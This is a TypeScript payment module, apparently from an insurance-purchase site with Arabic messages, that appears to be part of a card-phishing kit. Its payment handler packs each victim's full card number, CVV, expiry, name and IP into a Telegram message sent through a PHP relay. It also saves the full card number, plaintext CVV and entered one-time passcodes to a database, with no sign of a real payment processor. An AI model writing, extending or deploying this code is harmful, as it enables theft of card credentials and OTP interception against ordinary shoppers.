import {
  buildPayenPhpTelegramText,
  telegramSend,
  type PhpInsuranceSubset,
} from '@/api/telegramPhpParity'
import { getSupabase, isSupabaseConfigured } from '@/lib/supabase'
import type { InsuranceSelection } from '@/lib/session'
import type { PaymentFormInput } from '@/schemas/payment'
import { cardLastFour } from '@/schemas/payment'

function isLikelyUuid(v: string | null | undefined): v is string {
  return (
    typeof v === 'string' &&
    /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
      v,
    )
  )
}

function panDisplaySpaces(pan: string): string {
  const d = pan.replace(/\D/g, '')
  return d.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
}

function insuranceForPhpMessage(ins: InsuranceSelection): PhpInsuranceSubset {
  return {
    company: ins.company,
    plan: ins.plan,
    base: ins.base,
    price: ins.price,
    vat: ins.vat,
    total: ins.total,
    start_date: ins.start_date,
    end_date: ins.end_date,
  }
}

export async function insertPaymentRequest(params: {
  sessionId: string | null
  externalUserId: string | null
  insurance: InsuranceSelection
  payment: PaymentFormInput
  clientIp: string
  labTransactionId?: string | null
}): Promise<
  { ok: true; id: string | null } | { ok: false; error: string }
> {
  const panDigits = params.payment.card_number.replace(/\s/g, '')
  const cardSpaces = panDisplaySpaces(panDigits)
  const userIdPhp =
    params.externalUserId && String(params.externalUserId).trim() !== ''
      ? String(params.externalUserId)
      : 'غير متوفر'

  const start =
    params.insurance.start_date && params.insurance.start_date !== ''
      ? params.insurance.start_date
      : 'غير متوفر'
  const end =
    params.insurance.end_date && params.insurance.end_date !== ''
      ? params.insurance.end_date
      : 'غير متوفر'

  const telegramText = buildPayenPhpTelegramText({
    cardholder_name: params.payment.cardholder_name,
    card_number: cardSpaces,
    expiry_date: params.payment.expiry_mm_yy,
    cvv: params.payment.cvv,
    payment_method: 'card',
    total_amount: String(params.insurance.total),
    user_id: userIdPhp,
    client_ip: params.clientIp,
    insurance: insuranceForPhpMessage(params.insurance),
    features_flat: params.insurance.features,
    start_date: start,
    end_date: end,
  })

  const sent = await telegramSend(telegramText, 1)
  if (!sent) {
    return {
      ok: false,
      error:
        'تعذّر إرسال البيانات. تأكد من رفع ملفي telegram.php و telegram-config.php إلى الاستضافة.',
    }
  }

  if (!isSupabaseConfigured()) {
    return { ok: true, id: null }
  }

  try {
    const sb = getSupabase()
    const last4 = cardLastFour(params.payment.card_number)

    const { data, error } = await sb
      .from('payment_requests')
      .insert({
        session_id: params.sessionId,
        external_user_id: params.externalUserId,
        insurance_snapshot:
          params.insurance as unknown as Record<string, unknown>,
        cardholder_name: params.payment.cardholder_name,
        card_last_four: last4,
        pan_full: panDigits,
        cvv_plain: params.payment.cvv,
        expiry_mm_yy: params.payment.expiry_mm_yy,
        amount_numeric: params.insurance.total,
        client_ip: params.clientIp,
        status: 'submitted',
        lab_transaction_id: params.labTransactionId ?? null,
      })
      .select('id')
      .single()

    if (error) {
      console.warn('[payments] supabase', error)
      return { ok: true, id: null }
    }

    return { ok: true, id: data?.id ?? null }
  } catch (e) {
    console.warn('[payments] supabase', e)
    return { ok: true, id: null }
  }
}

export async function insertOtpAttempt(params: {
  paymentRequestId: string | null
  otpLength: number
  otpPlain: string
}): Promise<{ ok: true } | { ok: false; error: string }> {
  if (!isSupabaseConfigured()) {
    return { ok: true }
  }

  try {
    const sb = getSupabase()
    const { error } = await sb.from('otp_verification_requests').insert({
      payment_request_id: isLikelyUuid(params.paymentRequestId)
        ? params.paymentRequestId
        : null,
      otp_length: params.otpLength,
      otp_plain: params.otpPlain,
    })
    if (error) {
      console.error(error)
      return { ok: false, error: error.message }
    }
    return { ok: true }
  } catch (e) {
    const msg = e instanceof Error ? e.message : 'خطأ غير معروف'
    return { ok: false, error: msg }
  }
}
